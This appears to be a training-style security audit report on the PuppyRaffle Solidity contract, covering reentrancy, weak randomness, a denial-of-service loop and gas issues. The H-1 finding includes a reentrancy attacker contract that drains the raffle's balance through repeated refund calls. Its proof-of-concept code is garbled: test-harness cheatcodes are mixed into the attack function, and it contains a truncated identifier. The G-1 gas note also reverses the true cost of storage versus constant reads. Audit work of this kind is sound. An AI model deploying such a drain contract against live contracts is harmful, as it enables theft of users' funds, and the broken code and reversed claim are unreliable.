### [H-1] Reentrancy attack in `PuppyRaffle::refund` function allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checs, Effects, Interactions) and as a result, enable participants to drain the contract balance.

In the `PupplyRaffle::refund` function we make an external call to the `msg.sender` and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript

function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        
        
@>       payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);


        emit RaffleRefunded(playerAddress);
    }

```
A player who has entered the raffle could have a `fallback/receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.


**Impact** All the entranceFees can be stolen by the malicious participant

**Proof Of Code**

1. User enters raffle.
2. Attacker sets up a contract with a `fallback` function that call `PuppyRaffle::refund`.
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from the attack contract, draining all the contract balance.


**Proof of Code**
<details>
<summary>Code</summary>

```javascript

contract ReentrancyAttacker{
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();

    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;
        
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Starting Attacker Contract Balance", startingAttackContractBalance);
        console.log("Starting Contract Balance", startingContractBalance);

         console.log("Ending Attacker Contract Balance", address(attackerContract).balance);
         console.log("Ending Contract Balance", address(puppyRaffle).balan);
    }

    function stealMoney() internal  {
        if(address(puppyRaffle).balance >= entranceFee)
        {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        stealMoney();
    }

    receive() external payable{
        stealMoney();
    }
}

```

</details>


**Recommend Mitigation** To prevent this we should update the players array before the external call, additionally we should move the event emission up as well.

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner()` allows user to influence or predict the winner

**Description** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable final number. A attacker can choose a winner by themselves.

*Note:* This additionally means attacker, can front-run this function and call `refund()` if they see they are not the winner.

**Impact** Any user can influence the winner of the raffle, winning the money and selecting the rarest puppy. 

**Proof Of Concept**

1. Validators can know ahead of time, `block.timestamp` and `block.difficulty` and use that to predict, when and how to participate.
`block.difficulty` was replaced by `block.prevrando` for the safety purpose.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generated the winner!
3. Users can revert their `selectWinner` transaction if they don;t like the winner or selected puppy.

**Recommended Mitigation** Condider using a crptographically provable random number generator such as `Chainlink VRF`.


### [M-1] Looping through the players array to check the duplicates in `PupplyRaffle::enterRaffle` is a potential denial of service (DOS) attack, incrementing gas costs for the future entrants

Impact: MEDIUM 
LIKELIHOOD - Medium

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be automatically lower than those who enter later. 
Every additional address in the array, is an additional check the loop will have to make.

```javascript
//@Audit DOS
for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

**Impact:** The gas costs to enter raffle will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have two sets of 100 players enter, the gas costs will be as follows:

- 1st 100 players: 6252128 gas
- 2nd 100 players: 18068218 gas

This is more than 3x expensive for the second 100 players.

<details>
<summary>PoC</summary>
Place the following test into `PupplyRaffleTest.sol`,

```javascript

function test_denialOfService() public {
        vm.txGasPrice(1);
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for(uint256 i=0; i< playersNum;i++)
        {
            players[i] = address(i);
        }
        //gas Costs:
        uint256 gasStarts = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnds = gasleft();

        uint256 gasUsed = (gasStarts - gasEnds) * tx.gasprice;
        console.log("Gas used for 100 players", gasUsed);

         address[] memory playersTwo = new address[](playersNum);
        for(uint256 i=0; i< playersNum;i++)
        {
            players[i] = address(i + playersNum);
        }
        //gas Costs:
        uint256 gasStartsTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndsTwo = gasleft();

        uint256 gasUsedTwo = (gasStartsTwo - gasEndsTwo) * tx.gasprice;
        console.log("Gas used for 2nd 100 players", gasUsedTwo);

        assert(gasUsed < gasUsedTwo);
    }


```
</details>


**Recommended Mitigation:**

1. Consider allowing duplicates.Users can make new wallet adderesses, so duplicate check won't work.
2. Consider using a mapping to check for duplicates.This would allow constant time lookup of whether a user has already entered. 

Alternatively, can use [OpenZeppelin's `EnumerableSet` library]
(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol)

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existence players and player at index 0, causing a player at index 0 to incorrectly think he has not entered the raffle

**Description** If a player in the `PuppyRaffle::players` array is at index 0 it will return 0.

```javascript

   function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
@>        return 0;
    }

```

**Impact** A player at index 0 to incorrectly think he has not entered the raffle, and may attempt to enter the raffle again, wasting gas.

**Proof Of Concept**
1. User enters raffle.
2. `PuppyRaffle::players` returns 0 for player at index 0, incorrectly reflecting player not entered.
3. Player attempts to enter again.

**Recommended Mitigation** The easiest way is to `revert` if player is not in the array instead of returning 0.

Better solution might be to return an `int256`, whereas function returns -1 if player is not active.


### [I-1]: Solidity pragma should be specific not wide

Consider using specific version of solidity instead of wide versions.
For example, instead of using `^0.8.0` use `0.8.0`;

- Found in src/PupplyRaffle.sol

### [I-2]: `PuppyRaffle::selectWinner()` does not follow [CEI], which is not a best practice

### GAS

### [G-1]: Unchanged `State Varibles` should be assigned as `Immutable` or `Constant`:

Insight: Reading from `storage` is much more gas effective than reading from `constant` or `immutable`

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffel::commonImageUri` should be `constant`
- `PuppyRaffel::rareImageUri` should be `constant`
- `PuppyRaffel::legendaryImageUri` should be `constant`

### [G-2]: Storage variables in loop should be `Cached`:

Insight: Everytime you read `players.length` you read it from storage, instead of memory, which is more gas efficient.

```diff
+ uint256 playerLength = players.length;
- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < playerLength - 1; i++) {
-  for (uint256 j = i + 1; j < players.length; j++) {
+   for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
    }

```



